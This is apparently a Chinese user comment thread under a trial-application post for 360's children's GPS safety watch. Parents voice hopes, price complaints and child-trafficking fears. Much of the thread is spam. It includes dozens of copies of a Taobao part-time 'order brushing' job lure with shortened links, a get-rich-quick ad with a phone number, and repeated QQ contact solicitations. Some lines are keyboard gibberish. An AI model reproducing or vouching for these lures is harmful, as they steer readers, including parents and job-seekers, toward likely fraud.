1000元创业、1年成富翁 10年打工终成空，1年创业成富翁。正在职场拼博的朋友，早8晚5的朋友，想改变命运的朋友，来吧！这是一个新兴的行业，一项国家支持的项目，也是未来发展的趋势，巨大的发展空间，人人都用的产品。 能看到此广告的朋友，祝您好运，改变命运的时刻到来了。机不可失，失不再来！把握住机会才不会后悔！！！ 当今1000元能干什么？--  详情请拨打招财热线：131-6685-9678 
1000元创业、1年成富翁 10年打工终成空，1年创业成富翁。正在职场拼博的朋友，早8晚5的朋友，想改变命运的朋友，来吧！这是一个新兴的行业，一项国家支持的项目，也是未来发展的趋势，巨大的发展空间，人人都用的产品。 能看到此广告的朋友，祝您好运，改变命运的时刻到来了。机不可失，失不再来！把握住机会才不会后悔！！！ 当今1000元能干什么？-----。 详情请拨打招财热线：131-6685-9678 
赞，很好可以用
还行，很好
希望你们把范围加大
非常好，赞
真好啊，不错
很方便。如果再增加一键锁屏功能就更好了。
好期待呀，我希望可以申请到一款，谢谢。
希望能拥有一款这件产品来保护女儿的安全，太实用了！
哈哈，神器啊
钱不是问题，只要为了孩子，希望申请成功 
希望能拥有一款这件产品来保护儿女们的安全，太实用了！ 
？？？？？？
祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷祈祷
希望这个手表给更多人带来帮助！
希望可以制作不锈钢材质的产品，这样更加经久耐用，也希望360产品，总是有更高的科技，更低的价钱，更加的经久耐用。
其实现在用智能手机的，在上面安装一个文档扫描仪应用，就可以拍摄扫描了。效果与大型扫描仪一样。我都用过，多页扫描可以直接转化为PDF文档，我最多的一份文件，327页，非常清晰。
钱不是问题，只要为了孩子，希望申请成功                                    _______真理
360这款式手表 肯定大卖 出口也没问题的 。希望给我儿子申请一个 。代我儿子谢谢 360的叔叔 阿姨们。
那这东西的能量从什么地方来,一旦植入就不可能拆除更换电池,难道过几天拿个插头插孩子身上,还是过段时间给孩子开刀换电池.至于说使用生物类科技,现在还没那技术呢
给baby一份安全保障 
和他老妈一样宅的小帅哥，希望他能更开朗
希望能申请到一个，对宝宝的安全问题太有帮助了，希望能早点上市，买一个也好！
不错  很好的产品     网络兼职不影响正职，时间自由加我Q号517-808-240
是啊要是支持联通的就好了
希望能申请到一个，对宝宝的安全问题太有帮助了 
希望能申请成功
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
挂          .--.         /.-. &#039;----------.         \&#039;-&#039; .--&quot;--&quot;&quot;-&quot;-&#039;是不是显的有些大，功能显的不是很突出，价格合理可以入手尝试下、、          &#039;--&#039; 
写的不错，看的我们这些没中的人都有买的欲望了
太好了 我代表所有孩子的家长谢谢你们，有你们产品也许就为打击拐卖儿童提供很好的信息。再次强烈呼吁拐卖直接判死刑，只有死刑极性古代那种残酷的极性，尤其凌迟用在拐卖儿童罪犯身上，才能彻底的结束拐卖行为。
就不是给贩卖儿童提醒！！手表有跟踪功能太招摇太显眼，应当往其它配带上面设计比如儿童配带的玩具项连戒指
我同意！！！！！！！！！！！！！！！！！！！！！！！！！！！！
一直担心孩子的安全问题，有安全卫士真的太好了！！！！感谢360，感谢设计者和研发者。
这个都行啊 
太感动了，在儿童安全问题令人非常头疼和担心的今天，你们及时推出了这样一款好的产品！相信一定能受到广大家长的喜爱和欢迎！我自己就是一个5岁孩子的妈妈，非常希望能得到试用这款商品的机会，为孩子增添一份安全和幸福的保障！谢谢！
360这款式手表 肯定大卖  。希望给我家小孩申请一个 。谢谢 360的叔叔 阿姨们。  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
太感动了，在儿童安全问题令人非常头疼和担心的今天，你们及时推出了这样一款好的产品！相信一定能受到广大家长的喜爱和欢迎！第一眼看到这款产品就让我非常的激动，很有前途，只要一迈向市场就会让整个市场都疯狂起来的，我自己就是一个6岁孩子的妈妈，非常希望能得到试用这款商品的机会，为孩子增添一份安全和幸福的保障！谢谢
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
帮我留一块啊
希望能申请成功，今后带孩子出门更放心
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
希望能申请成功，以后去超市娱乐场所，就更安全了，很期待哦
太好了，希望能够申请到一个
360的产品出来一个爱一个买一个，发现360定位都很准确。为了孩子是每一代人最大的希望。我想申请一个。并会遵守规定。谢谢！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
很好的创意思路。希望申请成功
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】   
太贵了，像我们这月光组买不起
快点出产品吧，设计师们辛苦了，非常感谢你们的创意和产品
360是我一直信赖的品牌，大品牌，希望我能申请到，我会力推此产品的，，，
这个产品大爱,解决了后顾之忧,每次代儿子出去都提心吊胆,希望能替他申请一个!
360的产品出来一个爱一个买一个，发现360定位都很准确。为了孩子是每一代人最大的希望。我想申请一个。并会遵守规定。谢谢！ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
希望申请成功，以后出门就在也不要一直拉着孩子的手不放，可以让他玩得更开心
为了孩子是每一代人最大的希望。解决了后顾之忧,每次代儿子出去都提心吊胆，我想申请一个。并会遵守规定。谢谢！  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
创意改变生活，期待中
要是放大街上你确定不会被人拿走了？
360儿童卫士精确定位，真是太好，这样就不用担心孩子去哪儿了，想申请一个，并推及其它好友。谢谢
什么时候开始公开发售，需要
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】   
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】   
希望能申请成功，以后去其他的公共场所，就很安全了！
怎么申请？感觉挺好用.
产品看着真不错，支持一个
好想申请到啊，给我儿子用！
产品看着真不错，支持一个，但愿我也能成功，为无暇照顾的小孩保驾护航
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
已经申请，期待可以申请到
已经申请了
强烈期待中 
报告写的不错，产品更是神器，支持一个，但愿我也能成功，为无暇照顾的小孩保驾护航
如果是真的，我也想试试
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
送我一辆。 
好想要。好想要~~~
多来几张图片，说一下功能就更好了
真的有创意
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
呵呵，整体设计挺好看的
说的对，应该做得再隐蔽些。
这么宣传，人贩子知道了肯定先拿掉手表先的，除非设置一个很小的芯片，随便我们放那里看不见的还好。
厉害啊！ 真的期待！
申请了，期待啊，这个真的很好用，360儿童安全卫士第一代我朋友家孩子用过，当时就很喜欢，不只是外表，功能定位都很棒，这次希望可以免费试用哦，
挺喜欢的，就是不知道要多少钱了！价格合适的话可以入手几个用用！
不错，我喜欢这个东东 
不错的产品，希望能够为孩子申请到
已经申请，像买双色球一样激动。呵呵。。。。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
想问一下这款手表定位的有效范围是多少公里以内？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
我现在才知道360出了这么多的小产品，都好想要啊！
太棒了，怎么才能适用
快点开卖吧！早一点开卖，孩子的安全就能早点多一分保障！！！
明天你是否还想起360儿童卫士，明天你是否还惦记申请的儿童手表.
产品好好 希望我能申请到  设计师们辛苦了  
现在社会上很多拐卖小孩的新闻，看到都心疼，很担心小孩的安全，一直希望有一样东西在小孩身上可以随时知道她在哪里，如果允许植入GPS芯片在身上，我都愿意，但是这个伤害有点大，毕竟是女孩子，有个疤痕不好嘛，看到这个发明，感觉可以试一下，希望真能起作用啦！
对，我也喜欢阿狸！
对，我也喜欢阿狸！
已申请，对小朋友和家里人是个很大的帮助
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
申请了，期待啊，
好希望能够申请成功！现在看到那些被拐卖去当乞丐的孩子，断胳膊断腿的，看的都心疼！有这个之后，肯定会好很多！至少时时刻刻都知道孩子在安全的地方！赞一个！~\(≧▽≦)/~
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
大爱！！！好想给我家宝宝申请一个呀
我希望我的申请到！
希望能申请成功，孩子安全，爸爸妈妈更安心
应该很实用，如果能有它，前两天我的钱包就不会被盗了。
一楼你妈喊你回家吃饭了
路由器带摄像头，清洁机器人，按摩器360疯了吧？
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
翘首以盼中
好东西，几时上市啊，不过确实不能太显眼了，小小的，只有家人知道才安全
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
希望我可以申请到，按了真的好喜欢，以前买过一个定位手机，虽然很小一个，还可以通话，但是很不方便，这么小的孩子怎么可能带在身上呢，还有可能会丢，而且试了位置不正确，看了这个手表我觉得很不错，这样小孩带着比较方便，也不怕丟，不怕忘记了。
我希望我的申请到！ 
我想說.....有了這個神器（360兒童衛士）再也不怕人販子啦
什么时候能拍？
希望可以拥有一个这么好的产品，支持
有了这个，不怕孩子晚回家了
超棒，向你们推荐 
质量非常差，不防水。我买了半个月就坏了，唉。
产品真如商家所说的那样，价钱不是问题，我会给宝宝买。期待中
感觉这款手表不错，希望能申请到！
希望能申请成功，孩子安全，爸爸妈妈更饭心，要申请成功啊！！！！！！！！！！！！！！！！ 
不知道二代相对于一代有什么改进呢
能买到就行啊，可是上哪里买啊？？？申请通过的太少了
超好超好的手表，功能太全了，十分喜欢，希望能给孩子申请到。
360的系列产品都是好货，软件还是硬件，都只能用一个字来形容：牛！
真心想得到，孩子在部队院里长大，太好动了。
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
这个就是一个福音，给我吧，给我吧，给我吧，祝福天下所有的父母都没有能用到的一天。
一代没赶上试用，二代来试试啦
但是可以向别人借火啊
超好的手表，功能太全了，十分喜欢
希望能申请成功
卡哇伊内，好喜欢！！
期待成功!
太好啦，我以后不会晚起啦
一代没赶上试用，二代来试试啦 
申请成功 ...............
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
不错真能了解家长的心，随时知道孩子在哪。支持顶一个！
好像买啊，很实用啊
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
太贵了，估计没人买
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
好，我不会乱丢！
哇  我喜欢！！！可是好贵啊！！！
希望我能申请到
真是这样的话小说上的虚拟头盔也不远了，好期待啊
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
没说的好东西，我想要。。。。。。。
好贵啊，东西是好东西就是太贵了
真心希望能够试用成功，孩子太调皮，已经走丢一次了，不希望再有第二次了。。。。。
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
可以打电话吗
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
你好，我这边是做这款定位系统的，如您需要可以加我qq:330128578
这东西估计难普及，价格和一次性是硬伤
等待治理上海空气
孩子和360安全卫士有一次不解的奇缘。孩子一周岁多一点，第一次接触电脑，居然喜欢上电脑桌面上的360安全卫士图标，成了他最爱点击的图标。并自己学会了用鼠标点击。
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
送货来要不要钱?
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
要小点才好
脑秃创意。。
很好了，外观也可以设计成数字型，方便观看，不看是不出现字，外观看起来会更美
这个东西看起来不错，不知道用起来怎么样。孩子非常淘气，总是走丢，希望能试用成功。
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
创意不错，但拒绝日货！期望国产电子产品……
好想要啊    恩
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
设计理念beautiful，价格上有点难接受
强烈期待中
妈呀，这太贵了，想要没能力啊
蛮好的  价格是多少阿？
孩子平安，大人安心
看着好方便的
希望这个东西，能够让我的心脏能够不再那么接受激励的动荡。
想要啊！！是送给父母的一样非常贴心的礼物
孩子是每个家庭最关注的，希望能随时能关注到孩子的所在，让悬着的一颗心可以稍稍放松。期待着......
赶快开卖吧  等很久了
感觉很好，求试用，@！！
预约码根本不可用啊
支持了1个项目
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
我非常看好和支持这个项目，
都2代了！什么时候能发售啊！宝宝马上就要上大班了都。
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
我女儿超喜欢，期待中
很不错的设备  
我建议，能不能可以在手机上控制电源开关，或者有定时系统
淘宝才卖30多呢
将近九千快钱，有点贵了。
希望可以得到这一款送给孩子，可以随时知道孩子的安全情况，希望可以申请到！！！
这个必须有!
价格是好多嘞？
好期待哦!!!!!!!!!!
嗯，举双手双脚赞成。
额，还挺好，价格可以的话先买几个咯。质量怎么样？如果不错再买几个给朋友先给我爸妈买几个咯 
这个月是我女儿生日，这手表就当她生日礼物，包含着一片妈妈浓浓情意
土豪的玩具?我穷我想拥有!
1111111111111111111111
我女儿超喜欢，期待期待。要可以的话在给朋友的孩子买个做礼物。啥时发售啊？等不及了都快。
不错，不过我女儿10月才到生日
好想拥有哦!!!!!!!!!!!!!!!!!!
很时尚，孩子会喜欢，不过学校会让进么
这个必须有!
mjhbhgttggy
还会不会你还敢昊vgfjvjfuiogxiogjdoji风格的投入方法封测人的反而是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是是股份股份认购日记急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急
希望可以通过筛选，让孩子更安全 
我们家的小孩子天性顽皮，只要你一转眼的工夫，这小家伙就不知道跑哪里去了
希望可以通过筛选，让孩子更安全   
强烈期待中!!!!!!!!!!!!!!!!!! 
希望可以得到这一款送给孩子，可以随时知道孩子的安全情况，希望可以申请到！！！  
真心希望能够试用成功，孩子太调皮，已经走丢了好多次了，希望可以得到这一款送给孩子，可以随时知道孩子的安全情况，希望可以申请到！！！   
真心 希望能帮助到老婆 找顽皮的宝宝
真心希望能够快点收到 
快点出来定价吧。选不中，我买也行啊。。。。。。。。。。。。。。。！！！！！！
超好超好的手表，功能太全了，十分喜欢，希望能给孩子申请到。  
虽然女儿上小学4年级了，可学校不允许带手机，有时放学晚了很着急，想知道她的具的位置 ·
急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急急 ！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
很期待，这样的话我就不用担心小孩子不能把心思花在学习上了。
送给父母是个很好的选择
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
一直没有公布，好像是骗人的。。。。。。。。。。
女儿5月22号比赛，希望能给她个惊喜。偶期待中。。。。。。
真心希望能得到试用的机会，宝贝随时都给我惊吓，随时一转眼人就不见了，有了这个以后就好了，就可以把惊吓变成惊喜了
这个真是个好东东，希望物美价廉
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
